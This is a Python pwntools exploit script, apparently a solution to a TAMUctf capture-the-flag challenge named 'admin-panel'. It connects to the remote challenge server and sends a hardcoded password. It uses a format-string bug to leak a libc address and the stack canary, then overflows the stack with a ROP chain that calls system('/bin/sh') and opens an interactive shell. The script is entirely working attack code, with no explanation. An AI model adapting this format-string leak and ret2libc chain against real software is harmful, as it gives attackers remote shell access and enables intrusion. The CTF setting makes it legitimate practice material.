from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

li=[280959, 281043, 938758]

e = context.binary = ELF('admin-panel')

# r= e.process()
# lib = e.libc
# while(1):
ld= ELF('ld-2.28.so')
r =remote("tamuctf.com", 443, ssl=True, sni="admin-panel")
lib= ELF('libc.so.6')

r.sendline(b"admin")
payload =b"secretpass123\x00".ljust(32,b"a")+f"%{0xb+6}$p|%15$p".encode()
r.sendlineafter(b"24:\n", payload)

r.recvuntil(b"0x")
leak = int(r.recv(12), 16)
print(hex(lib.sym.__libc_start_main))
log.info("leak: %#x" %(leak+3861))
base_libc = leak- lib.sym.__libc_start_main-0x3000+48 #(local)
# base_libc = leak- lib.sym.__libc_start_main-0x3000+3861 #server
r.recvuntil(b"|0x")
canary = int(r.recv(16), 16)

# system_libc = base_libc + lib.sym.system+0x3000
system_libc = base_libc + 0x44AF0
# binsh_libc = base_libc + next(lib.search(b"/bin/sh"))+0x3000
binsh_libc = base_libc + 0x18052C
pop_rdi_ret = base_libc + lib.sym.iconv+0x3000+265
# pop_rdi_ret = base_libc + lib.sym.iconv+197+0x3000
ret = pop_rdi_ret+1
log.info("canary: %#x" %canary)
log.info("base_libc: %#x" %base_libc)
log.info("system_libc: %#x" %system_libc)
log.info("binsh_libc: %#x" %binsh_libc)
# r.interactive()
r.sendlineafter(b"or 3: \n", b"2")

payload = b"N"*72
# payload+= flat(canary)
payload+= flat(canary,ret,ret, pop_rdi_ret, binsh_libc, system_libc)

pause()
r.sendlineafter(b"wrong:\n",payload)
    # output = r.recv(1000)
    # if b"timeout: the monitored" in output:
        # r.close()
    # else:
        # r.sendline(b"ls")
        # r.sendline(b"cat flag*")
r.interactive(prompt="")

  